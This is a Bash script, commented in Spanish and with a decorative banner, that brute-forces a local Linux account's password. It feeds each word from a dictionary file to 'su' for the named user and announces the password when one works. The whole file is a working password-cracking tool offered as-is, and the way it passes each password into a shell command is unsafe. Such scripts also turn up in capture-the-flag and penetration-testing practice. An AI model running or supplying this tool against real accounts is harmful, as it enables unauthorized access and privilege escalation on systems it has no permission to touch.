#!/bin/bash

# Colores
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
yellowColour="\e[0;33m\033[1m"
greenColour="\e[0;32m\033[1m"
blueColour="\e[0;34m\033[1m"
whiteColour="\e[1;37m\033[1m"

###### FUNCIONAMIENTO DEL PROGRAMA ######

# Recibe un usuario y un diccionario, mediante un comando realiza fuerza bruta hasta que dará con la contraseña
# (En el caso de que se encuentre en el diccionario especificado)

# Cuando el usuario pulse ctrl+c el programa finaliza
ctrl_c(){
    echo -e "\n${redColour}Finalizando script...${endColour}"
    tput cnorm ; exit 1
}

# Llamamos a la función con trap SIGINT
trap ctrl_c SIGINT

# Función para mostrar ayuda del script 
mostrar_ayuda() {
    echo -e "${yellowColour}Uso: $0 USUARIO DICCIONARIO"
    echo -e "Se deben especificar tanto el nombre de usuario como el archivo de diccionario${endColour}"
    exit 1
}

# Función para imprimir banner
mostrar_banner(){
    echo -e ${greenColour}'       __                  _ __      '${whiteColour}'  ___              __      __     '${endColour}
    echo -e ${greenColour}'      / /_  ______ _____  (_) /_____ '${whiteColour}' /   |  ____  ____/ /___ _/ /_  __'${endColour}
    echo -e ${greenColour}' __  / / / / / __ `/ __ \/ / __/ __ \\'${whiteColour}'/ /| | / __ \/ __  / __ `/ / / / /'${endColour}
    echo -e ${greenColour}'/ /_/ / /_/ / /_/ / / / / / /_/ /_/ /'${whiteColour}' ___ |/ / / / /_/ / /_/ / / /_/ / '${endColour}
    echo -e ${greenColour}'\____/\__,_/\__,_/_/ /_/_/\__/\____/'${whiteColour}'_/  |_/_/ /_/\__,_/\__,_/_/\__,_/  \n'${endColour}
}

usuario=$1
diccionario=$2

if [ $# != 2 ]; then
    mostrar_ayuda
fi

if ! id $usuario &>/dev/null; then
    echo -e "${redColour}[!] El usuario $usuario no existe${endColour}"
    exit 1
else
    if [ ! -f $diccionario ]; then
        echo -e "${redColour}[!] El diccionario no es correcto o no existe${endColour}"
        exit 1
    fi
fi

clear; mostrar_banner

tput civis
while IFS= read -r password; do
    echo -e "${whiteColour}Probando contraseña:${endColour} ${blueColour}$password${endColour}"
	if timeout 0.1 bash -c "echo $password | su $usuario -c 'echo Hello'" &> /dev/null ; then
	    clear
	    echo -e "${greenColour}Contraseña encontrada para el usuario $usuario:${endColour} ${yellowColour}$password${endColour}"
	    encontrado=1
	    break
	fi
done < "$diccionario"; tput cnorm

# Si se encuentra la contraseña se muestra la bandera de andalucia
if [[ $encontrado -eq 1 ]];then
	echo -e "\n${greenColour}######################${endColour}"
	echo -e "${greenColour}######################${endColour}"
	echo -e "${whiteColour}######################${endColour}"
	echo -e "${whiteColour}######################${endColour}"
	echo -e "${greenColour}######################${endColour}"
	echo -e "${greenColour}######################${endColour}\n"

	echo -e "${greenColour}¡¡¡VIVA ANDALUZIA COHONE!!!${endColour}"

else
	echo -e "\n${blueColour}No se ha dao con la contraseña :(${endColour}"
fi
